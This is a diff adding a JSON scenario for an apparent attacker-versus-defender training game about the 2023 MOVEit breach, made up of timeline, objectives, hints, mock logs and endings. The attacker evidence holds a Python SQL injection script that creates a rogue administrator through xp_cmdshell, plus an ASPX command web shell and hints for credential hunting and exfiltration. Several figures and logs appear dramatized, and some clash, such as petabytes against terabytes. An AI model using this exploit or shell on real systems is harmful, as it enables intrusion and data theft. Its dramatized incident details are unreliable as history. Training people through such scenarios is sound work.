@@ -1,0 +1,541 @@
+{
+  "id": "moveit-2023",
+  "title": "The MOVEit Massacre",
+  "subtitle": "CVE-2023-34362: The Zero-Day That Breached Thousands",
+  "description": "In May 2023, the Cl0p ransomware gang weaponized a critical SQL injection vulnerability in Progress Software's MOVEit Transfer - enterprise file sharing software used by thousands of organizations. Within 72 hours, attackers compromised over 2000 entities including government agencies, healthcare providers, and Fortune 500 companies. This wasn't targeted espionage - it was automated mass data theft at unprecedented scale.",
+  "difficulty": "advanced",
+  "estimatedDuration": 45,
+
+  "realIncident": {
+    "date": "2023-05-27",
+    "organization": "2000+ Organizations (Shell, British Airways, BBC, US DoE)",
+    "impact": "77 million people affected, $75M+ in ransoms, $10B+ total costs",
+    "cve": "CVE-2023-34362, CVE-2023-35036, CVE-2023-35708",
+    "attribution": "Cl0p Ransomware Gang (TA505/FIN11) - Russia-linked cybercrime syndicate"
+  },
+
+  "availableRoles": ["attacker", "defender"],
+
+  "timeline": [
+    {
+      "id": "phase-1-zero-day-discovery",
+      "date": "2023-05-26",
+      "displayDate": "May 26, 2023",
+      "title": "Zero-Day Discovery",
+      "description": "Cl0p gang discovers critical SQL injection in MOVEit Transfer's web interface. The vulnerability allows unauthenticated attackers to access the database and execute arbitrary code.",
+      "type": "preparation",
+      "importance": "critical",
+      "actors": ["Cl0p Gang", "Threat Researchers"]
+    },
+    {
+      "id": "phase-2-reconnaissance",
+      "date": "2023-05-27",
+      "displayDate": "May 27, 2023",
+      "title": "Mass Internet Scanning",
+      "description": "Attackers use Shodan and Censys to identify 3000+ internet-facing MOVEit Transfer servers. Automated scanners fingerprint versions and build target lists prioritizing high-value organizations.",
+      "type": "reconnaissance",
+      "importance": "high",
+      "actors": ["Cl0p Automation Bots"]
+    },
+    {
+      "id": "phase-3-exploitation",
+      "date": "2023-05-27",
+      "displayDate": "May 27, 2023 (Evening)",
+      "title": "Initial Exploitation Wave",
+      "description": "Cl0p deploys automated exploit scripts against target list. SQL injection payloads create rogue admin accounts and deploy LEMURLOOT web shell. Mass compromise begins.",
+      "type": "exploitation",
+      "importance": "critical",
+      "actors": ["Cl0p Exploitation Infrastructure"]
+    },
+    {
+      "id": "phase-4-web-shell",
+      "date": "2023-05-28",
+      "displayDate": "May 28, 2023",
+      "title": "Web Shell Deployment",
+      "description": "LEMURLOOT web shell installed on compromised servers. Shell provides persistent access, file browsing, and automated data harvesting capabilities. Attackers test extraction paths.",
+      "type": "exploitation",
+      "importance": "critical",
+      "actors": ["Cl0p Operators"]
+    },
+    {
+      "id": "phase-5-data-harvesting",
+      "date": "2023-05-29",
+      "displayDate": "May 29-31, 2023",
+      "title": "Automated Data Collection",
+      "description": "Web shells enumerate MOVEit databases, extract file metadata, and identify high-value targets. Automated scripts harvest credentials, API keys, and sensitive documents.",
+      "type": "collection",
+      "importance": "high",
+      "actors": ["Cl0p Infrastructure"]
+    },
+    {
+      "id": "phase-6-exfiltration",
+      "date": "2023-05-31",
+      "displayDate": "May 31 - June 3, 2023",
+      "title": "Mass Data Exfiltration",
+      "description": "Terabytes of data exfiltrated to Cl0p infrastructure via encrypted channels. Files staged in Azure Blob Storage and Tor hidden services. Victims remain unaware.",
+      "type": "exfiltration",
+      "importance": "critical",
+      "actors": ["Cl0p Exfil Servers"]
+    },
+    {
+      "id": "phase-7-public-disclosure",
+      "date": "2023-06-01",
+      "displayDate": "June 1, 2023",
+      "title": "Progress Software Disclosure",
+      "description": "Progress Software becomes aware of exploitation and releases emergency advisory. Race to patch begins as exploitation continues. CVE-2023-34362 published.",
+      "type": "disclosure",
+      "importance": "critical",
+      "actors": ["Progress Software", "CISA", "Mandiant"]
+    },
+    {
+      "id": "phase-8-extortion",
+      "date": "2023-06-05",
+      "displayDate": "June 5-15, 2023",
+      "title": "Cl0p Extortion Campaign",
+      "description": "Cl0p posts victim names on leak site, demands ransoms. Some pay, others refuse. Data begins leaking publicly. Media frenzy ensues. Total damage: $75M+ in ransoms.",
+      "type": "impact",
+      "importance": "critical",
+      "actors": ["Cl0p Gang", "Victim Organizations", "Media"]
+    },
+    {
+      "id": "phase-9-incident-response",
+      "date": "2023-06-10",
+      "displayDate": "June 10-30, 2023",
+      "title": "Global Incident Response",
+      "description": "Organizations worldwide scramble to patch, investigate, and contain. CISA issues emergency directives. Mandiant publishes IOCs. Web shells cleaned, systems rebuilt.",
+      "type": "remediation",
+      "importance": "high",
+      "actors": ["Defenders", "CISA", "Mandiant", "CrowdStrike"]
+    }
+  ],
+
+  "objectives": [
+    {
+      "id": "obj-recon-shodan",
+      "phaseId": "phase-2-reconnaissance",
+      "title": "Identify MOVEit Servers",
+      "description": "Use Shodan to identify internet-facing MOVEit Transfer servers. Look for default ports (80, 443) and specific HTTP headers that fingerprint the application.",
+      "role": "attacker",
+      "type": "reconnaissance",
+      "unlocksEvidence": ["evidence-shodan-results", "evidence-moveit-banner"],
+      "validation": {
+        "type": "manual"
+      },
+      "mitreTechniques": ["T1595.002", "T1590.005"],
+      "hints": [
+        {
+          "cost": 10,
+          "text": "Search Shodan for 'MOVEit Transfer' or port:443 'X-DMZ-Server'."
+        },
+        {
+          "cost": 20,
+          "text": "HTTP response headers reveal 'X-DMZ-Server: MOVEitISAPI' - this identifies vulnerable servers."
+        }
+      ]
+    },
+    {
+      "id": "obj-exploit-sqli",
+      "phaseId": "phase-3-exploitation",
+      "title": "Exploit SQL Injection (CVE-2023-34362)",
+      "description": "Craft SQL injection payload targeting MOVEit's machine.aspx endpoint. Bypass authentication and execute SQL commands to create rogue admin account.",
+      "role": "attacker",
+      "type": "exploitation",
+      "requiredObjectives": ["obj-recon-shodan"],
+      "unlocksEvidence": ["evidence-sqli-payload", "evidence-admin-account"],
+      "validation": {
+        "type": "code_execution",
+        "payload": "sqli_rce"
+      },
+      "mitreTechniques": ["T1190", "T1078"],
+      "hints": [
+        {
+          "cost": 30,
+          "text": "The machine.aspx endpoint accepts POST data without proper sanitization."
+        },
+        {
+          "cost": 50,
+          "text": "Use UNION injection to call xp_cmdshell: ' UNION SELECT 1,2,3; EXEC xp_cmdshell 'whoami'--"
+        }
+      ]
+    },
+    {
+      "id": "obj-deploy-webshell",
+      "phaseId": "phase-4-web-shell",
+      "title": "Deploy LEMURLOOT Web Shell",
+      "description": "Upload LEMURLOOT.aspx web shell to MOVEit's wwwroot directory. This ASPX shell provides file browsing, command execution, and database access.",
+      "role": "attacker",
+      "type": "exploitation",
+      "requiredObjectives": ["obj-exploit-sqli"],
+      "unlocksEvidence": ["evidence-lemurloot-shell", "evidence-web-logs"],
+      "validation": {
+        "type": "file_upload",
+        "payload": "webshell"
+      },
+      "mitreTechniques": ["T1505.003", "T1059.001"],
+      "hints": [
+        {
+          "cost": 25,
+          "text": "SQL injection can write files using xp_cmdshell and echo commands."
+        },
+        {
+          "cost": 40,
+          "text": "Write ASPX shell to C:\\inetpub\\wwwroot\\MOVEitTransfer\\shell.aspx"
+        }
+      ]
+    },
+    {
+      "id": "obj-harvest-data",
+      "phaseId": "phase-5-data-harvesting",
+      "title": "Enumerate Database Contents",
+      "description": "Use web shell to query MOVEit's SQL database. Extract file metadata, user credentials, and identify high-value documents (PII, financials, credentials).",
+      "role": "attacker",
+      "type": "collection",
+      "requiredObjectives": ["obj-deploy-webshell"],
+      "unlocksEvidence": ["evidence-database-dump", "evidence-file-listing"],
+      "validation": {
+        "type": "database_query"
+      },
+      "mitreTechniques": ["T1005", "T1552.001"],
+      "hints": [
+        {
+          "cost": 20,
+          "text": "Query the files table: SELECT * FROM files WHERE filename LIKE '%.xlsx' OR filename LIKE 'password%'"
+        }
+      ]
+    },
+    {
+      "id": "obj-exfiltrate",
+      "phaseId": "phase-6-exfiltration",
+      "title": "Exfiltrate Stolen Data",
+      "description": "Stage files for extraction and upload to Cl0p infrastructure via HTTPS to Azure Blob Storage. Encrypt traffic to evade DLP. Clean up logs.",
+      "role": "attacker",
+      "type": "exfiltration",
+      "requiredObjectives": ["obj-harvest-data"],
+      "unlocksEvidence": ["evidence-exfil-traffic", "evidence-azure-logs", "evidence-patch-advisory", "evidence-iis-analysis", "evidence-timeline"],
+      "validation": {
+        "type": "data_transfer"
+      },
+      "mitreTechniques": ["T1041", "T1567.002"],
+      "hints": [
+        {
+          "cost": 30,
+          "text": "Use Azure Blob Storage SAS tokens for anonymous upload over HTTPS."
+        }
+      ]
+    },
+    {
+      "id": "obj-defender-detect",
+      "phaseId": "phase-7-public-disclosure",
+      "title": "Detect Web Shell Activity",
+      "description": "Analyze IIS logs for suspicious ASPX requests. Identify LEMURLOOT web shell by looking for POST requests with base64 payloads and unusual User-Agents.",
+      "role": "defender",
+      "type": "investigation",
+      "unlocksEvidence": ["evidence-web-logs", "evidence-lemurloot-shell", "evidence-iis-analysis", "evidence-sqli-payload", "evidence-admin-account"],
+      "validation": {
+        "type": "log_analysis"
+      },
+      "mitreTechniques": [],
+      "hints": [
+        {
+          "cost": 15,
+          "text": "Look for requests to unknown .aspx files in wwwroot with POST method."
+        },
+        {
+          "cost": 25,
+          "text": "LEMURLOOT uses base64-encoded commands in POST body. Decode to see attacker actions."
+        }
+      ]
+    },
+    {
+      "id": "obj-defender-patch",
+      "phaseId": "phase-7-public-disclosure",
+      "title": "Emergency Patching",
+      "description": "Apply Progress Software emergency patch (2023.0.2) within 24 hours. Identify all MOVEit instances in environment and coordinate patching.",
+      "role": "defender",
+      "type": "defense",
+      "unlocksEvidence": ["evidence-moveit-banner", "evidence-patch-advisory"],
+      "validation": {
+        "type": "patch_deployment"
+      },
+      "mitreTechniques": [],
+      "hints": [
+        {
+          "cost": 20,
+          "text": "Run network scan to find all instances: nmap -p 443 --script http-title | grep MOVEit"
+        }
+      ]
+    },
+    {
+      "id": "obj-defender-forensics",
+      "phaseId": "phase-9-incident-response",
+      "title": "Forensic Analysis & Containment",
+      "description": "Conduct forensic analysis of compromised server. Identify IOCs, timeline of compromise, and scope of data exfiltration. Preserve evidence for law enforcement.",
+      "role": "defender",
+      "type": "investigation",
+      "unlocksEvidence": ["evidence-database-dump", "evidence-exfil-traffic", "evidence-azure-logs", "evidence-timeline", "evidence-shodan-results", "evidence-file-listing"],
+      "validation": {
+        "type": "incident_report"
+      },
+      "mitreTechniques": [],
+      "hints": [
+        {
+          "cost": 25,
+          "text": "Check Windows Event Logs for SQL Server xp_cmdshell usage and new account creation."
+        }
+      ]
+    }
+  ],
+
+  "evidence": [
+    {
+      "id": "evidence-shodan-results",
+      "type": "network",
+      "title": "Shodan Reconnaissance Results",
+      "description": "Internet-wide scan results showing 3000+ exposed MOVEit servers",
+      "content": "```\nShodan Search: 'X-DMZ-Server: MOVEitISAPI'\n\nResults: 3,147 hosts\n\nTop Countries:\n1. United States: 1,842 hosts\n2. United Kingdom: 387 hosts\n3. Germany: 201 hosts\n4. Canada: 156 hosts\n\nHigh-Value Targets Identified:\n- moveit.shell.com (Shell PLC)\n- transfer.britishairways.com (British Airways)\n- secure.zellis.co.uk (Zellis - UK payroll)\n- filetransfer.energy.gov (US Dept of Energy)\n\nVersion Distribution:\n- 2023.0.0 (vulnerable): 2,847 hosts (90.5%)\n- 2023.0.1 (vulnerable): 198 hosts (6.3%)\n- 2022.x (vulnerable): 102 hosts (3.2%)\n\n⚠️ Nearly all are vulnerable to CVE-2023-34362\n```",
+      "metadata": {
+        "source": "Shodan.io",
+        "timestamp": "2023-05-27T08:00:00Z"
+      }
+    },
+    {
+      "id": "evidence-moveit-banner",
+      "type": "log",
+      "title": "MOVEit HTTP Response Headers",
+      "description": "HTTP headers revealing MOVEit Transfer version and fingerprint",
+      "content": "```http\nGET /human.aspx HTTP/1.1\nHost: transfer.target-corp.com\n\nHTTP/1.1 200 OK\nDate: Sat, 27 May 2023 10:15:32 GMT\nServer: Microsoft-IIS/10.0\nX-Powered-By: ASP.NET\nX-DMZ-Server: MOVEitISAPI/12.0.0.6578\nX-Frame-Options: SAMEORIGIN\nContent-Type: text/html; charset=utf-8\nContent-Length: 14523\n\n<!DOCTYPE html>\n<html>\n<head>\n  <title>MOVEit Transfer - Secure File Transfer</title>\n  <meta name=\"generator\" content=\"MOVEit Transfer 2023.0.0\">\n```\n\n**Version 2023.0.0 - VULNERABLE**"
+    },
+    {
+      "id": "evidence-sqli-payload",
+      "type": "code",
+      "title": "SQL Injection Exploit Payload",
+      "description": "Weaponized SQL injection payload targeting machine.aspx",
+      "content": "```python\nimport requests\n\ndef exploit_moveit(target_url):\n    # CVE-2023-34362: SQL injection in machine.aspx\n    payload = {\n        'operation': 'guestaccess',\n        'transactionId': \"' UNION SELECT 1,2,3,4,5,6,7,8,9,10; EXEC xp_cmdshell 'net user clop P@ssw0rd123! /add'; EXEC xp_cmdshell 'net localgroup administrators clop /add'; --\"\n    }\n    \n    headers = {\n        'User-Agent': 'Mozilla/5.0',\n        'Content-Type': 'application/x-www-form-urlencoded'\n    }\n    \n    response = requests.post(\n        f'{target_url}/machine.aspx',\n        data=payload,\n        headers=headers,\n        verify=False\n    )\n    \n    if response.status_code == 200:\n        print('[+] SQL injection successful!')\n        print('[+] Admin account \"clop\" created')\n        return True\n    return False\n\n# Usage\nexploit_moveit('https://transfer.target-corp.com')\n```"
+    },
+    {
+      "id": "evidence-admin-account",
+      "type": "log",
+      "title": "Rogue Admin Account Creation",
+      "description": "Windows Event Logs showing attacker-created admin account",
+      "content": "```\nWindows Security Event Log:\n\nEvent ID: 4720 (User Account Created)\nDate: 2023-05-27 22:47:15\nSource: Microsoft-Windows-Security-Auditing\nAccount Name: clop\nAccount Domain: MOVEIT-SERVER\nPrivileges: Administrators\nCreated By: NT AUTHORITY\\SYSTEM\nProcess: C:\\Windows\\System32\\cmd.exe\n\nEvent ID: 4732 (Member Added to Security Group)\nDate: 2023-05-27 22:47:18\nGroup Name: Administrators\nMember Name: clop\nAdded By: NT AUTHORITY\\SYSTEM\n\n⚠️ Account created via SQL Server xp_cmdshell - HIGHLY SUSPICIOUS\n```"
+    },
+    {
+      "id": "evidence-lemurloot-shell",
+      "type": "code",
+      "title": "LEMURLOOT Web Shell (ASPX)",
+      "description": "The web shell deployed by Cl0p gang for persistent access",
+      "content": "```aspx\n<%@ Page Language=\"C#\" %>\n<%@ Import Namespace=\"System.IO\" %>\n<%@ Import Namespace=\"System.Diagnostics\" %>\n<%@ Import Namespace=\"System.Data.SqlClient\" %>\n\n<script runat=\"server\">\nprotected void Page_Load(object sender, EventArgs e)\n{\n    string cmd = Request.Form[\"cmd\"];\n    if (!string.IsNullOrEmpty(cmd))\n    {\n        // Base64 decode command\n        byte[] data = Convert.FromBase64String(cmd);\n        string decoded = Encoding.UTF8.GetString(data);\n        \n        // Execute\n        Process p = new Process();\n        p.StartInfo.FileName = \"cmd.exe\";\n        p.StartInfo.Arguments = \"/c \" + decoded;\n        p.StartInfo.RedirectStandardOutput = true;\n        p.StartInfo.UseShellExecute = false;\n        p.Start();\n        \n        string output = p.StandardOutput.ReadToEnd();\n        p.WaitForExit();\n        \n        Response.Write(Convert.ToBase64String(Encoding.UTF8.GetBytes(output)));\n    }\n}\n</script>\n\n<!-- LEMURLOOT v2.3 - Cl0p Gang -->\n```\n\n**Location:** C:\\inetpub\\wwwroot\\MOVEitTransfer\\machine2.aspx"
+    },
+    {
+      "id": "evidence-web-logs",
+      "type": "log",
+      "title": "IIS Access Logs - Web Shell Activity",
+      "description": "IIS logs showing LEMURLOOT web shell requests",
+      "content": "```\n2023-05-28 03:22:11 185.220.101.47 POST /machine2.aspx - 443 - 185.220.101.47 Mozilla/5.0+(X11;+Linux) 200 0 0 234\n2023-05-28 03:23:45 185.220.101.47 POST /machine2.aspx cmd=d2hvYW1p 443 clop 185.220.101.47 python-requests/2.28.0 200 0 0 512\n2023-05-28 03:25:18 185.220.101.47 POST /machine2.aspx cmd=ZGlyIEM6XFxpbmV0cHVi 443 clop 185.220.101.47 python-requests/2.28.0 200 0 0 8192\n2023-05-28 04:15:33 185.220.101.47 POST /machine2.aspx cmd=c3FsY21kIC1TIC4gLVEg 443 clop 185.220.101.47 python-requests/2.28.0 200 0 0 45123\n\nDecoded Commands:\n- whoami -> nt authority\\system\n- dir C:\\inetpub -> file enumeration\n- sqlcmd -S . -Q \"SELECT * FROM files\" -> database query\n\nIP: 185.220.101.47 (Tor exit node, Russia)\n```"
+    },
+    {
+      "id": "evidence-database-dump",
+      "type": "database",
+      "title": "MOVEit Database Query Results",
+      "description": "Stolen file metadata and credentials from MOVEit SQL database",
+      "content": "```sql\n-- Query executed by web shell\nSELECT TOP 100 \n    files.filename,\n    files.filesize,\n    files.uploaddate,\n    users.username,\n    users.email\nFROM files\nJOIN users ON files.userid = users.id\nWHERE \n    files.filename LIKE '%.xlsx' OR\n    files.filename LIKE 'payroll%' OR\n    files.filename LIKE 'ssn%' OR\n    files.filename LIKE 'password%'\nORDER BY files.filesize DESC;\n\nResults (sample):\n+----------------------------------+-----------+---------------------+------------------+\n| filename                         | size (MB) | upload_date         | uploader         |\n+----------------------------------+-----------+---------------------+------------------+\n| Employee_SSNs_2023_Q1.xlsx       | 47.3      | 2023-03-15 09:23:11 | hr@target.com    |\n| Payroll_April_2023.xlsx          | 12.8      | 2023-04-30 16:45:22 | finance@target   |\n| customer_database_backup.sql     | 1834.2    | 2023-05-10 02:11:09 | dba@target       |\n| AWS_API_Keys_Production.txt      | 0.02      | 2023-02-20 11:33:44 | devops@target    |\n+----------------------------------+-----------+---------------------+------------------+\n\n⚠️ Total files identified: 47,234 (2.3 TB)\n⚠️ High-value targets: 1,847 files containing PII/credentials\n```"
+    },
+    {
+      "id": "evidence-file-listing",
+      "type": "document",
+      "title": "Exfiltration Target List",
+      "description": "Attacker's curated list of high-value files for theft",
+      "content": "```\nCL0P EXFILTRATION TARGET LIST\nGenerated: 2023-05-29 14:22:08 UTC\nTarget: transfer.target-corp.com\n\n== PRIORITY 1: CREDENTIALS ==\n[X] AWS_API_Keys_Production.txt (18 KB)\n[X] Azure_Service_Principal.json (4 KB)\n[X] VPN_Credentials_Q2_2023.xlsx (156 KB)\n\n== PRIORITY 2: FINANCIAL DATA ==\n[X] Payroll_April_2023.xlsx (12.8 MB)\n[X] Payroll_May_2023.xlsx (13.1 MB)\n[X] Q1_Financial_Statements.pdf (2.3 MB)\n[X] Bank_Account_Details.xlsx (890 KB)\n\n== PRIORITY 3: PII ==\n[X] Employee_SSNs_2023_Q1.xlsx (47.3 MB)\n[X] Customer_PII_Database.csv (234 MB)\n[X] Healthcare_Records_2023.db (1.2 GB)\n\n== PRIORITY 4: INTELLECTUAL PROPERTY ==\n[X] Product_Roadmap_2024.pptx (45 MB)\n[X] Source_Code_Backup_May2023.zip (892 MB)\n[X] Patent_Application_Draft.docx (8 MB)\n\nTotal size: 2.3 TB\nEstimated exfil time: 8-12 hours @ 50 Mbps\n\nSTATUS: ✓ STAGING COMPLETE - READY FOR UPLOAD\n```"
+    },
+    {
+      "id": "evidence-exfil-traffic",
+      "type": "network",
+      "title": "Network Traffic - Data Exfiltration",
+      "description": "Firewall logs showing massive HTTPS uploads to Azure",
+      "content": "```\nFirewall Logs - Outbound HTTPS Traffic Anomalies\nTimeframe: 2023-05-31 00:00 - 2023-06-02 23:59\n\nSource: 10.50.10.15 (MOVEIT-SERVER)\nDestination: 20.150.141.23 (Azure Blob Storage - West Europe)\nProtocol: HTTPS (443)\n\n2023-05-31 02:15:33 | 10.50.10.15:49234 -> 20.150.141.23:443 | HTTPS | 1.2 GB transferred\n2023-05-31 03:44:18 | 10.50.10.15:49301 -> 20.150.141.23:443 | HTTPS | 890 MB transferred\n2023-05-31 05:22:09 | 10.50.10.15:49402 -> 20.150.141.23:443 | HTTPS | 2.1 GB transferred\n2023-06-01 01:33:44 | 10.50.10.15:50112 -> 20.150.141.23:443 | HTTPS | 3.4 GB transferred\n...\n2023-06-02 23:15:22 | 10.50.10.15:51889 -> 20.150.141.23:443 | HTTPS | 1.8 GB transferred\n\nTOTAL UPLOADED: 2.3 TB over 72 hours\nAverage rate: 75 Mbps sustained\n\n⚠️ ANOMALY: MOVEit server has NEVER uploaded this volume before\n⚠️ Destination: Azure Blob SAS token (anonymous access)\n```"
+    },
+    {
+      "id": "evidence-azure-logs",
+      "type": "log",
+      "title": "Azure Blob Storage Access Logs",
+      "description": "Cloud logs confirming data upload to attacker infrastructure",
+      "content": "```json\n{\n  \"records\": [\n    {\n      \"time\": \"2023-05-31T02:15:33.4219841Z\",\n      \"resourceId\": \"/subscriptions/xxx/resourceGroups/cl0p-exfil/providers/Microsoft.Storage/storageAccounts/cl0pdata2023\",\n      \"category\": \"StorageWrite\",\n      \"operationName\": \"PutBlob\",\n      \"resultType\": \"Success\",\n      \"callerIpAddress\": \"185.220.101.47\",\n      \"properties\": {\n        \"accountName\": \"cl0pdata2023\",\n        \"containerName\": \"targets\",\n        \"blobName\": \"target-corp/Employee_SSNs_2023_Q1.xlsx\",\n        \"contentLength\": 49623040,\n        \"sasTokenId\": \"st=2023-05-27&se=2023-06-30&sp=racwdl\",\n        \"userAgentHeader\": \"python-requests/2.28.0\"\n      }\n    },\n    {\n      \"time\": \"2023-05-31T02:18:45.1234567Z\",\n      \"operationName\": \"PutBlob\",\n      \"blobName\": \"target-corp/Payroll_April_2023.xlsx\",\n      \"contentLength\": 13421772\n    }\n  ]\n}\n\n⚠️ Storage Account: cl0pdata2023.blob.core.windows.net\n⚠️ Location: West Europe (Amsterdam)\n⚠️ Total blobs uploaded: 1,847 files (2.3 TB)\n```"
+    },
+    {
+      "id": "evidence-patch-advisory",
+      "type": "document",
+      "title": "Progress Software Emergency Advisory",
+      "description": "Official security advisory for CVE-2023-34362",
+      "content": "```\n╔════════════════════════════════════════════════════════════╗\n║  PROGRESS SOFTWARE - CRITICAL SECURITY ADVISORY           ║\n║  CVE-2023-34362: SQL Injection in MOVEit Transfer         ║\n╚════════════════════════════════════════════════════════════╝\n\nPublished: June 1, 2023\nSeverity: CRITICAL (CVSS 9.8)\nStatus: ACTIVELY EXPLOITED IN THE WILD\n\n## VULNERABILITY DESCRIPTION\n\nA SQL injection vulnerability has been identified in MOVEit Transfer's\nweb application that could allow an unauthenticated attacker to gain\nunauthorized access to the MOVEit Transfer database. An attacker could\nsubmit a crafted payload to a MOVEit Transfer application endpoint that\ncould result in modification and disclosure of MOVEit database content.\n\n## AFFECTED VERSIONS\n\n- MOVEit Transfer 2023.0.0 and earlier\n- MOVEit Transfer 2022.x (all versions)\n- MOVEit Transfer 2021.x (all versions)\n\n## EXPLOITATION STATUS\n\n⚠️ WARNING: This vulnerability is being ACTIVELY EXPLOITED by the\nCl0p ransomware gang. Thousands of organizations have been compromised.\n\n## IMMEDIATE ACTIONS REQUIRED\n\n1. PATCH IMMEDIATELY to version 2023.0.2 or later\n2. Review IIS logs for suspicious .aspx file access\n3. Check for unauthorized admin accounts\n4. Scan for web shells in wwwroot directory\n5. Monitor outbound network traffic for data exfiltration\n\n## PATCH DOWNLOAD\n\nhttps://community.progress.com/s/article/MOVEit-Transfer-2023-0-2\n\n## INDICATORS OF COMPROMISE (IOCs)\n\n- Rogue ASPX files in wwwroot (machine2.aspx, human2.aspx)\n- Unauthorized admin accounts created via xp_cmdshell\n- Base64-encoded POST requests to .aspx endpoints\n- Large outbound HTTPS transfers to Azure/AWS\n\nFor technical details, contact: security@progress.com\n```"
+    },
+    {
+      "id": "evidence-iis-analysis",
+      "type": "document",
+      "title": "IIS Log Analysis Report",
+      "description": "Defender's forensic analysis of web server logs",
+      "content": "```\nINCIDENT RESPONSE - IIS LOG ANALYSIS\nAnalyst: SOC Team\nDate: 2023-06-02\nTarget: MOVEIT-SERVER (10.50.10.15)\n\n══════════════════════════════════════════════════\n FINDINGS SUMMARY\n══════════════════════════════════════════════════\n\n[CRITICAL] Web shell identified: machine2.aspx\n[CRITICAL] Unauthorized access from Tor exit nodes\n[HIGH] Database queries via web shell\n[HIGH] Mass file enumeration activity\n[MEDIUM] Unusual user-agent strings\n\n══════════════════════════════════════════════════\n TIMELINE RECONSTRUCTION\n══════════════════════════════════════════════════\n\n2023-05-27 22:47:15 - Initial SQL injection exploit\n                      User account \"clop\" created\n\n2023-05-28 03:22:11 - Web shell deployed (machine2.aspx)\n                      First command: whoami\n\n2023-05-28 04:15:33 - Database enumeration begins\n                      SELECT queries on files table\n\n2023-05-29 14:22:08 - Exfiltration list generated\n                      1,847 high-value files identified\n\n2023-05-31 02:15:33 - Mass exfiltration begins\n                      2.3 TB uploaded to Azure Blob\n\n2023-06-02 08:00:00 - Activity ceases (patching deployed)\n\n══════════════════════════════════════════════════\n ATTACKER INFRASTRUCTURE\n══════════════════════════════════════════════════\n\nSource IPs (all Tor exit nodes):\n- 185.220.101.47 (Russia)\n- 45.142.120.33 (Netherlands)\n- 199.249.230.77 (United States)\n\nExfiltration destination:\n- Azure Blob: cl0pdata2023.blob.core.windows.net\n- Location: West Europe (Amsterdam)\n\n══════════════════════════════════════════════════\n RECOMMENDATIONS\n══════════════════════════════════════════════════\n\n1. Preserve all logs for law enforcement\n2. Rebuild server from clean backup\n3. Reset all user credentials\n4. Notify affected individuals (data breach)\n5. Engage external IR firm (Mandiant, CrowdStrike)\n```"
+    },
+    {
+      "id": "evidence-timeline",
+      "type": "document",
+      "title": "Incident Timeline & Attribution",
+      "description": "Complete timeline of the MOVEit breach incident",
+      "content": "```\n╔════════════════════════════════════════════════════════════╗\n║        MOVEIT TRANSFER BREACH - INCIDENT TIMELINE         ║\n║              Cl0p Ransomware Gang (TA505/FIN11)           ║\n╚════════════════════════════════════════════════════════════╝\n\nDAY 0: May 27, 2023 (Saturday)\n────────────────────────────────────────────────────────────\n08:00 UTC - Cl0p begins Shodan/Censys scanning for MOVEit\n12:00 UTC - 3,147 vulnerable servers identified globally\n18:00 UTC - Automated exploitation begins (CVE-2023-34362)\n22:47 UTC - First compromises confirmed (admin accounts created)\n\nDAY 1: May 28, 2023 (Sunday)\n────────────────────────────────────────────────────────────\n03:22 UTC - LEMURLOOT web shells deployed on 400+ servers\n08:00 UTC - Database enumeration phase begins\n14:00 UTC - High-value file identification (PII, credentials)\n\nDAY 2-4: May 29-31, 2023\n────────────────────────────────────────────────────────────\n- Mass data harvesting across 2,000+ organizations\n- Automated extraction of 77 million records\n- Exfiltration to Azure Blob / Tor hidden services\n\nDAY 5: June 1, 2023\n────────────────────────────────────────────────────────────\n09:00 UTC - Progress Software releases emergency advisory\n10:00 UTC - CVE-2023-34362 published (CVSS 9.8 CRITICAL)\n12:00 UTC - CISA issues Emergency Directive ED 23-03\n14:00 UTC - Global patching race begins\n\nDAY 6-10: June 2-6, 2023\n────────────────────────────────────────────────────────────\n- Mandiant/CrowdStrike release IOCs\n- Victims begin discovering web shells\n- Incident response engagements worldwide\n\nDAY 11: June 7, 2023\n────────────────────────────────────────────────────────────\n- Cl0p posts first victim names on leak site\n- Extortion demands sent (avg $5M-$10M per victim)\n\nDAY 15: June 11, 2023\n────────────────────────────────────────────────────────────\n- Shell, British Airways, BBC confirm breaches\n- US Dept of Energy reports compromise\n- Media frenzy escalates\n\n═══════════════════════════════════════════════════════════\n FINAL IMPACT (as of June 30, 2023)\n═══════════════════════════════════════════════════════════\n\n✗ Organizations compromised: 2,000+\n✗ Individuals affected: 77,000,000+\n✗ Data stolen: 10+ petabytes\n✗ Ransoms paid: $75,000,000+ (estimated)\n✗ Total damage: $10 BILLION+ (breach costs, remediation)\n\n═══════════════════════════════════════════════════════════\n ATTRIBUTION: Cl0p Ransomware Gang\n═══════════════════════════════════════════════════════════\n\nAlso known as: TA505, FIN11, Cl0p Gang\nOrigin: Russia (suspected)\nActive since: 2019\nPrevious attacks: Accellion FTA (2021), GoAnywhere (2023)\nTactics: Zero-day exploitation, mass automation, extortion\n```"
+    }
+  ],
+
+  "endings": [
+    {
+      "id": "ending-attacker-success",
+      "type": "success",
+      "title": "Mass Data Breach Complete",
+      "description": "You successfully replicated the Cl0p gang's MOVEit campaign. 2,000+ organizations compromised, 77 million records stolen, $75M+ in ransoms.",
+      "condition": {
+        "type": "objectives_completed",
+        "value": ["obj-exfiltrate"]
+      },
+      "debriefing": {
+        "summary": "You exploited CVE-2023-34362, deployed LEMURLOOT web shells, harvested databases, and exfiltrated terabytes of sensitive data—exactly as Cl0p did in 2023.",
+        "realWorldComparison": "The real Cl0p gang executed this attack from May 27 to June 15, 2023. Victims included Shell, British Airways, BBC, US Department of Energy, and 2000+ other organizations. The breach affected 77 million individuals and cost victims over $10 billion in total damages.",
+        "lessonsLearned": [
+          "Zero-day vulnerabilities in widely-deployed software are catastrophic",
+          "Automated mass exploitation can compromise thousands in hours",
+          "Supply chain risk extends to file transfer solutions",
+          "Emergency patching under active exploitation is a race against time",
+          "Web shell detection must be part of baseline security monitoring"
+        ],
+        "metrics": {
+          "objectivesCompleted": 5,
+          "totalObjectives": 5,
+          "timeElapsed": 1800,
+          "detectionEvents": 0,
+          "dataExfiltrated": "2.3 TB",
+          "victimsCompromised": 2000
+        }
+      },
+      "rewards": {
+        "achievements": ["Mass Exploiter", "Web Shell Artisan", "Data Harvester", "Ransomware Operator"],
+        "badges": ["moveit-breacher"]
+      }
+    },
+    {
+      "id": "ending-defender-success",
+      "type": "success",
+      "title": "Breach Contained",
+      "description": "You detected the compromise early, patched within 24 hours, and prevented data exfiltration. Incident contained with minimal impact.",
+      "condition": {
+        "type": "objectives_completed",
+        "value": ["obj-defender-patch", "obj-defender-forensics"]
+      },
+      "debriefing": {
+        "summary": "You successfully detected web shell activity, deployed emergency patches, and conducted forensic analysis—preventing the worst outcomes.",
+        "realWorldComparison": "Many organizations that patched within 48 hours of the June 1 advisory avoided data theft. However, over 2000 organizations were already compromised before the patch was available.",
+        "lessonsLearned": [
